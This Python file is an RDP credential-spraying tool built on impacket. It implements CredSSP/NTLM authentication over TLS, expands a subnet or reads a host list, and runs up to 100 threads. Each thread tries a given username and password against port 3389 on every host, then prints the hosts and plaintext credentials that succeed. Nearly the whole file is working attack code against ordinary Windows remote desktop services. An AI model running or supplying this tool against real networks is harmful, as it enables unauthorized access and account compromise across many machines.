import os
import time
import ipaddress
import threading
from termcolor import colored
from struct import pack, unpack

try:
    from impacket.examples import logger
    from impacket.structure import Structure
    from impacket.spnego import GSSAPI, ASN1_SEQUENCE, ASN1_OCTET_STRING, asn1decode, asn1encode
except Exception as e:
    print('[Erro] %s \n [!] You need install impacket: pip install impacket'%e)

TDPU_CONNECTION_REQUEST  = 0xe0
TPDU_CONNECTION_CONFIRM  = 0xd0
TDPU_DATA                = 0xf0
TPDU_REJECT              = 0x50
TPDU_DATA_ACK            = 0x60
# RDP_NEG_REQ constants
TYPE_RDP_NEG_REQ = 1
PROTOCOL_RDP     = 0
PROTOCOL_SSL     = 1
PROTOCOL_HYBRID  = 2
# RDP_NEG_RSP constants
TYPE_RDP_NEG_RSP = 2
EXTENDED_CLIENT_DATA_SUPPORTED = 1
DYNVC_GFX_PROTOCOL_SUPPORTED   = 2
# RDP_NEG_FAILURE constants
TYPE_RDP_NEG_FAILURE                  = 3
SSL_REQUIRED_BY_SERVER                = 1
SSL_NOT_ALLOWED_BY_SERVER             = 2
SSL_CERT_NOT_ON_SERVER                = 3
INCONSISTENT_FLAGS                    = 4
HYBRID_REQUIRED_BY_SERVER             = 5
SSL_WITH_USER_AUTH_REQUIRED_BY_SERVER = 6

class TPKT(Structure):
    commonHdr = (
        ('Version','B=3'),
        ('Reserved','B=0'),
        ('Length','>H=len(TPDU)+4'),
        ('_TPDU','_-TPDU','self["Length"]-4'),
        ('TPDU',':=""'),
    )

class TPDU(Structure):
    commonHdr = (
        ('LengthIndicator','B=len(VariablePart)+1'),
        ('Code','B=0'),
        ('VariablePart',':=""'),
    )
    def __init__(self, data = None):
        Structure.__init__(self,data)
        self['VariablePart']=''

class CR_TPDU(Structure):
    commonHdr = (
        ('DST-REF','<H=0'),
        ('SRC-REF','<H=0'),
        ('CLASS-OPTION','B=0'),
        ('Type','B=0'),
        ('Flags','B=0'),
        ('Length','<H=8'),
    )

class DATA_TPDU(Structure):
    commonHdr = (
        ('EOT','B=0x80'),
        ('UserData',':=""'),
    )
    def __init__(self, data = None):
        Structure.__init__(self,data)
        self['UserData'] =''

class RDP_NEG_REQ(CR_TPDU):
    structure = (
        ('requestedProtocols','<L'),
    )
    def __init__(self,data=None):
        CR_TPDU.__init__(self,data)
        if data is None:
            self['Type'] = TYPE_RDP_NEG_REQ

class RDP_NEG_RSP(CR_TPDU):
    structure = (
        ('selectedProtocols','<L'),
    )

class RDP_NEG_FAILURE(CR_TPDU):
    structure = (
        ('failureCode','<L'),
    )

class TSPasswordCreds(GSSAPI):
   def __init__(self, data=None):
       GSSAPI.__init__(self,data)
       del self['UUID']
  
   def getData(self):
       ans = pack('B', ASN1_SEQUENCE)
       ans += asn1encode( pack('B', 0xa0) +
              asn1encode( pack('B', ASN1_OCTET_STRING) + 
              asn1encode( self['domainName'].encode('utf-16le'))) +
              pack('B', 0xa1) + 
              asn1encode( pack('B', ASN1_OCTET_STRING) + 
              asn1encode( self['userName'].encode('utf-16le'))) +
              pack('B', 0xa2) + 
              asn1encode( pack('B', ASN1_OCTET_STRING) + 
              asn1encode( self['password'].encode('utf-16le'))) )
       return ans 

class TSCredentials(GSSAPI):
   def __init__(self, data=None):
       GSSAPI.__init__(self,data)
       del self['UUID']

   def getData(self):
     # Let's pack the credentials field
     credentials =  pack('B',0xa1) 
     credentials += asn1encode(pack('B',ASN1_OCTET_STRING) +
                    asn1encode(self['credentials']))
     ans = pack('B',ASN1_SEQUENCE) 
     ans += asn1encode( pack('B', 0xa0) +
            asn1encode( pack('B', 0x02) + 
            asn1encode( pack('B', self['credType']))) +
            credentials)
     return ans

class TSRequest(GSSAPI):
   def __init__(self, data=None):
       GSSAPI.__init__(self,data)
       del self['UUID']
       
   def fromString(self, data = None):
       next_byte = unpack('B',data[:1])[0]
       if next_byte != ASN1_SEQUENCE:
           raise Exception('SEQUENCE expected! (%x)' % next_byte)
       
       data = data[1:]
       decode_data, total_bytes = asn1decode(data) 
       next_byte = unpack('B',decode_data[:1])[0]
       if next_byte !=  0xa0:
            raise Exception('0xa0 tag not found %x' % next_byte)
       
       decode_data = decode_data[1:]
       next_bytes, total_bytes = asn1decode(decode_data)                
       # The INTEGER tag must be here
       if unpack('B',next_bytes[0:1])[0] != 0x02:
           raise Exception('INTEGER tag not found %r' % next_byte)
       
       next_byte, _ = asn1decode(next_bytes[1:])
       self['Version'] = unpack('B',next_byte)[0]
       decode_data = decode_data[total_bytes:]
       next_byte = unpack('B',decode_data[:1])[0]
       if next_byte == 0xa1:
           # We found the negoData token
           decode_data, total_bytes = asn1decode(decode_data[1:])
           next_byte = unpack('B',decode_data[:1])[0]
           if next_byte != ASN1_SEQUENCE:
               raise Exception('ASN1_SEQUENCE tag not found %r' % next_byte)
   
           decode_data, total_bytes = asn1decode(decode_data[1:])
           next_byte = unpack('B',decode_data[:1])[0]
           if next_byte != ASN1_SEQUENCE:
               raise Exception('ASN1_SEQUENCE tag not found %r' % next_byte)
           
           decode_data, total_bytes = asn1decode(decode_data[1:])
           next_byte = unpack('B',decode_data[:1])[0]
           if next_byte != 0xa0:
               raise Exception('0xa0 tag not found %r' % next_byte)
           
           decode_data, total_bytes = asn1decode(decode_data[1:])
           next_byte = unpack('B',decode_data[:1])[0]
           if next_byte != ASN1_OCTET_STRING:
               raise Exception('ASN1_OCTET_STRING tag not found %r' % next_byte)
           
           decode_data2, total_bytes = asn1decode(decode_data[1:])
           # the rest should be the data
           self['NegoData'] = decode_data2
           decode_data = decode_data[total_bytes+1:]
   
       if next_byte == 0xa2:
           # ToDo: Check all this
           # We found the authInfo token
           decode_data, total_bytes = asn1decode(decode_data[1:])
           next_byte = unpack('B',decode_data[:1])[0]
           if next_byte != ASN1_OCTET_STRING:
               raise Exception('ASN1_OCTET_STRING tag not found %r' % next_byte)
   
           decode_data2, total_bytes = asn1decode(decode_data[1:])
           self['authInfo'] = decode_data2
           decode_data = decode_data[total_bytes+1:]
   
       if next_byte == 0xa3:
           # ToDo: Check all this
           # We found the pubKeyAuth token
           decode_data, total_bytes = asn1decode(decode_data[1:])
           next_byte = unpack('B',decode_data[:1])[0]
           if next_byte != ASN1_OCTET_STRING:
               raise Exception('ASN1_OCTET_STRING tag not found %r' % next_byte)
   
           decode_data2, total_bytes = asn1decode(decode_data[1:])
           self['pubKeyAuth'] = decode_data2
   
   def getData(self):
     # Do we have pubKeyAuth?
     if 'pubKeyAuth' in self.fields:
         pubKeyAuth = pack('B',0xa3)
         pubKeyAuth += asn1encode(pack('B', ASN1_OCTET_STRING) +
                       asn1encode(self['pubKeyAuth']))
     else:
         pubKeyAuth = b''

     if 'authInfo' in self.fields:
         authInfo = pack('B',0xa2)
         authInfo+= asn1encode(pack('B', ASN1_OCTET_STRING) +
                       asn1encode(self['authInfo']))
     else: 
         authInfo = b''

     if 'NegoData' in self.fields:
         negoData = pack('B',0xa1) 
         negoData += asn1encode(pack('B', ASN1_SEQUENCE) +
                    asn1encode(pack('B', ASN1_SEQUENCE) + 
                    asn1encode(pack('B', 0xa0) + 
                    asn1encode(pack('B', ASN1_OCTET_STRING) + 
                    asn1encode(self['NegoData'])))))
     else:
         negoData = b''
     
     ans = pack('B', ASN1_SEQUENCE)
     ans += asn1encode(pack('B',0xa0) + 
            asn1encode(pack('B',0x02) + asn1encode(pack('B',0x02))) +
            negoData + authInfo + pubKeyAuth)
     
     return ans

if __name__ == '__main__':
    import socket
    import argparse
    import sys
    import logging
    from binascii import a2b_hex
    from Cryptodome.Cipher import ARC4
    from impacket import ntlm, version
    try:
        from OpenSSL import SSL, crypto
    except:
        logging.critical("pyOpenSSL is not installed, can't continue")
        sys.exit(1)
    
    class SPNEGOCipher:
        def __init__(self, flags, randomSessionKey):
            self.__flags = flags
            if self.__flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
                self.__clientSigningKey = ntlm.SIGNKEY(self.__flags, randomSessionKey)
                self.__serverSigningKey = ntlm.SIGNKEY(self.__flags, randomSessionKey,"Server")
                self.__clientSealingKey = ntlm.SEALKEY(self.__flags, randomSessionKey)
                self.__serverSealingKey = ntlm.SEALKEY(self.__flags, randomSessionKey,"Server")
                # Preparing the keys handle states
                cipher3 = ARC4.new(self.__clientSealingKey)
                self.__clientSealingHandle = cipher3.encrypt
                cipher4 = ARC4.new(self.__serverSealingKey)
                self.__serverSealingHandle = cipher4.encrypt
            else:
                # Same key for everything
                self.__clientSigningKey = randomSessionKey
                self.__serverSigningKey = randomSessionKey
                self.__clientSealingKey = randomSessionKey
                self.__clientSealingKey = randomSessionKey
                cipher = ARC4.new(self.__clientSigningKey)
                self.__clientSealingHandle = cipher.encrypt
                self.__serverSealingHandle = cipher.encrypt
            self.__sequence = 0

        def encrypt(self, plain_data):
            if self.__flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
                # When NTLM2 is on, we sign the whole pdu, but encrypt just
                # the data, not the dcerpc header. Weird..
                sealedMessage, signature =  ntlm.SEAL(self.__flags, 
                       self.__clientSigningKey, 
                       self.__clientSealingKey,  
                       plain_data, 
                       plain_data, 
                       self.__sequence, 
                       self.__clientSealingHandle)
            else:
                sealedMessage, signature =  ntlm.SEAL(self.__flags, 
                       self.__clientSigningKey, 
                       self.__clientSealingKey,  
                       plain_data, 
                       plain_data, 
                       self.__sequence, 
                       self.__clientSealingHandle)
            self.__sequence += 1
            return signature, sealedMessage

        def decrypt(self, answer):
            if self.__flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
                # TODO: FIX THIS, it's not calculating the signature well
                # Since I'm not testing it we don't care... yet
                answer, signature =  ntlm.SEAL(self.__flags, 
                        self.__serverSigningKey, 
                        self.__serverSealingKey,  
                        answer, 
                        answer, 
                        self.__sequence, 
                        self.__serverSealingHandle)
            else:
                answer, signature = ntlm.SEAL(self.__flags, 
                        self.__serverSigningKey, 
                        self.__serverSealingKey, 
                        answer, 
                        answer, 
                        self.__sequence, 
                        self.__serverSealingHandle)
                self.__sequence += 1
            return signature, answer

    def check_rdp(host, username, password, domain, hashes = None):
       if hashes is not None:
           lmhash, nthash = hashes.split(':')
           lmhash = a2b_hex(lmhash)
           nthash = a2b_hex(nthash)
       else:
           lmhash = ''
           nthash = ''

       tpkt = TPKT()
       tpdu = TPDU()
       rdp_neg = RDP_NEG_REQ()
       rdp_neg['Type'] = TYPE_RDP_NEG_REQ
       rdp_neg['requestedProtocols'] = PROTOCOL_HYBRID | PROTOCOL_SSL
       tpdu['VariablePart'] = rdp_neg.getData()
       tpdu['Code'] = TDPU_CONNECTION_REQUEST
       tpkt['TPDU'] = tpdu.getData()
   
       s = socket.socket()
       s.connect((host,3389)) #port default
       s.sendall(tpkt.getData())
       pkt = s.recv(8192)
       tpkt.fromString(pkt)
       tpdu.fromString(tpkt['TPDU'])
       cr_tpdu = CR_TPDU(tpdu['VariablePart'])

       if cr_tpdu['Type'] == TYPE_RDP_NEG_FAILURE:
           rdp_failure = RDP_NEG_FAILURE(tpdu['VariablePart'])
           rdp_failure.dump()
           logging.error("Server doesn't support PROTOCOL_HYBRID, hence we can't use CredSSP to check credentials")
           return
       else:
           rdp_neg.fromString(tpdu['VariablePart'])
       
       ctx = SSL.Context(SSL.TLSv1_2_METHOD)
       ctx.set_cipher_list(b'RC4,AES')
       tls = SSL.Connection(ctx,s)
       tls.set_connect_state()
       tls.do_handshake()
       
       auth = ntlm.getNTLMSSPType1('','',True, use_ntlmv2 = True)
       ts_request = TSRequest()
       ts_request['NegoData'] = auth.getData()
       tls.send(ts_request.getData())
       buff = tls.recv(4096)
       ts_request.fromString(buff)
   
       type3, exportedSessionKey = ntlm.getNTLMSSPType3(auth, ts_request['NegoData'], username, password, domain, lmhash, nthash, use_ntlmv2 = True)
       # Get server public key
       server_cert =  tls.get_peer_certificate()
       pkey = server_cert.get_pubkey()
       dump = crypto.dump_privatekey(crypto.FILETYPE_ASN1, pkey)
       # Fix up due to PyOpenSSL lack for exporting public keys
       dump = dump[7:]
       dump = b'\x30'+ asn1encode(dump)
       cipher = SPNEGOCipher(type3['flags'], exportedSessionKey)
       signature, cripted_key = cipher.encrypt(dump)
       ts_request['NegoData'] = type3.getData()
       ts_request['pubKeyAuth'] = signature.getData() + cripted_key
       try:
           # Sending the Type 3 NTLM blob
           tls.send(ts_request.getData())
           buff = tls.recv(1024)
       except Exception as err:
           if str(err).find("denied") > 0:
               # logging.error("Access Denied")
               sys.stdout.write('\r[-] [%s:%s:%s] Access Denied            '%(host,username,password))
           else:
               logging.error(err)
               time.sleep(5)
           return
       
       ts_request = TSRequest(buff)
       signature, plain_text = cipher.decrypt(ts_request['pubKeyAuth'][16:])
       tsp = TSPasswordCreds()
       tsp['domainName'] = domain
       tsp['userName']   = username
       tsp['password']   = password
       tsc = TSCredentials()
       tsc['credType'] = 1 # TSPasswordCreds
       tsc['credentials'] = tsp.getData()
       signature, cripted_creds = cipher.encrypt(tsc.getData())
       ts_request = TSRequest()
       ts_request['authInfo'] = signature.getData() + cripted_creds
       tls.send(ts_request.getData())
       tls.close()
       sys.stdout.write(f"\r{colored('[+]', 'green')} {colored('Host:','blue')}{host},{colored('Username:','blue')}{username},{colored('Password:','blue')}{password},{colored('Domain:','blue')}{domain} [{colored('SUCESS', 'green')}] \n")
       return True

    # Init the example's logger theme
    logger.init()
    print(version.BANNER)

def chunk(xs, n):
  L = len(xs)
  assert 0 < n <= L
  s, r = divmod(L, n)
  t = s + 1
  return ([xs[p:p+t] for p in range(0, r*t, t)] +
          [xs[p:p+s] for p in range(r*t, L, s)])

def info(txt):
    sys.stdout.write(txt)

def calcsubnet(arg):
    ipi = ipaddress.ip_interface(arg)
    info(f"{colored('[>]', 'yellow')} Address: {ipi.ip}\n")
    info(f"{colored('[>]', 'yellow')} Mask: {ipi.netmask}\n")
    info(f"{colored('[>]', 'yellow')} Cidr: {str(ipi.network).split('/')[1]}\n")
    info(f"{colored('[>]', 'yellow')} Network: {str(ipi.network).split('/')[0]}\n")
    info(f"{colored('[>]', 'yellow')} Broadcast: {ipi.network.broadcast_address}\n")
    return [ str(x) for x in ipaddress.IPv4Network(ipi.network)]

def brute(hosts, username, password, domain, hashes = None):
    for host in hosts:
        try:
            if check_rdp(host, username, password , domain, hashes = None):
                info(f'[+] {host}, {domain}\{username}:{password} ')
        except Exception as e:
            info(f"\r{colored('[-]', 'red')} {host}, {e} \t\t\t\t")

domain=''
THREADS = 100
if len(sys.argv) == 4:
    targets = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    if os.path.isfile(targets):
        hostList = open(targets).read().split('\n')
    else:
        hostList = calcsubnet(targets)

    if len(hostList) >= THREADS:
        hostList = chunk(hostList, THREADS) # Limit of threads
    else:
        hostList = chunk(hostList, len(hostList))

    for hosts in hostList:
        threading.Thread(target=brute,args=(hosts, username, password, domain)).start() 


